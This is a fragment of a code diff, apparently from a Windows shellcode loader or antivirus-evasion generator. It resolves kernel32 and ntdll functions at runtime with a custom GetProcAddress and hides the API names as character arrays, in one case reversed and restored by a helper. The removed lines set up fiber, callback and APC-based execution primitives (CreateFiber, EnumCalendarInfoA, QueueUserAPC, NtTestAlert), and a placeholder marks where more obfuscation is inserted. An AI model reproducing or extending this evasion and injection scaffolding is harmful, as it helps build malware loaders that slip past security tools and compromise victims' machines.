     pWriteProcessMemory MyWriteProcessMemory = (pWriteProcessMemory)MyGetProcAddress((HMODULE)kernel32module, (LPCSTR)write_process_memory);
-    char convert_thread_to_fiber[] = { 'C', 'o', 'n', 'v', 'e', 'r', 't', 'T', 'h', 'r', 'e', 'a', 'd', 'T', 'o', 'F', 'i', 'b', 'e', 'r', '\0' };
-    typedef LPVOID(WINAPI* pConvertThreadToFiber)(
-            LPVOID lpParameter
-    );
 
-    pConvertThreadToFiber MyConvertThreadToFiber = (pConvertThreadToFiber)MyGetProcAddress((HMODULE)kernel32module, (LPCSTR)convert_thread_to_fiber);
-
-    char get_current_process[] = { 'G', 'e', 't', 'C', 'u', 'r', 'r', 'e', 'n', 't', 'P', 'r', 'o', 'c', 'e', 's', 's', '\0' };
+    char get_current_process[] = { 's', 's', 'e', 'c', 'o', 'r', 'P', 't', 'n', 'e', 'r', 'r', 'u', 'C', 't', 'e', 'G', '\0' };
+    reverseString(get_current_process);
     typedef HANDLE(WINAPI* pGetCurrentProcess)(void);
-
     pGetCurrentProcess MyGetCurrentProcess = (pGetCurrentProcess)MyGetProcAddress((HMODULE)kernel32module, (LPCSTR)get_current_process);
-
-    char create_fiber[] = { 'C', 'r', 'e', 'a', 't', 'e', 'F', 'i', 'b', 'e', 'r', '\0' };
-    typedef LPVOID(WINAPI* pCreateFiber)(
-            SIZE_T dwStackSize,
-            LPFIBER_START_ROUTINE lpStartAddress,
-            LPVOID lpParameter
-    );
-
-    pCreateFiber MyCreateFiber = (pCreateFiber)MyGetProcAddress((HMODULE)kernel32module, (LPCSTR)create_fiber);
-
-    char switch_to_fiber[] = { 'S', 'w', 'i', 't', 'c', 'h', 'T', 'o', 'F', 'i', 'b', 'e', 'r', '\0' };
-    typedef VOID(WINAPI* pSwitchToFiber)(
-            LPVOID lpFiber
-    );
-
-    pSwitchToFiber MySwitchToFiber = (pSwitchToFiber)MyGetProcAddress((HMODULE)kernel32module, (LPCSTR)switch_to_fiber);
-    char enum_calendar_info[] = { 'E', 'n', 'u', 'm', 'C', 'a', 'l', 'e', 'n', 'd', 'a', 'r', 'I', 'n', 'f', 'o', 'A','\0' };
-    typedef BOOL(WINAPI* pEnumCalendarInfo)(
-            CALINFO_ENUMPROCA lpCalInfoEnumProc,
-            LCID Locale,
-            CALID Calendar,
-            CALTYPE CalType
-    );
-    pEnumCalendarInfo MyEnumCalendarInfoA = (pEnumCalendarInfo)MyGetProcAddress((HMODULE)kernel32module, (LPCSTR)enum_calendar_info);
-
-    char queue_user_apc[] = { 'Q', 'u', 'e', 'u', 'e', 'U', 's', 'e', 'r', 'A', 'P', 'C', '\0' };
-    typedef BOOL(WINAPI* pQueueUserAPC)(
-            PAPCFUNC pfnAPC,
-            HANDLE hThread,
-            ULONG_PTR dwData
-    );
-
-    pQueueUserAPC MyQueueUserAPC = (pQueueUserAPC)MyGetProcAddress((HMODULE)kernel32module, (LPCSTR)queue_user_apc);
-    char nt_test_alert[] = { 'N', 't', 'T', 'e', 's', 't', 'A', 'l', 'e', 'r', 't', '\0' };
-    typedef NTSTATUS(NTAPI* pNtTestAlert)(
-            VOID
-    );
-
-    pNtTestAlert MyNtTestAlert = (pNtTestAlert)GetProcAddress((HMODULE)ntdllmodule, (LPCSTR)nt_test_alert);
-#endif
-    ;
 
 	REPLACR_OBFUSCATION
 
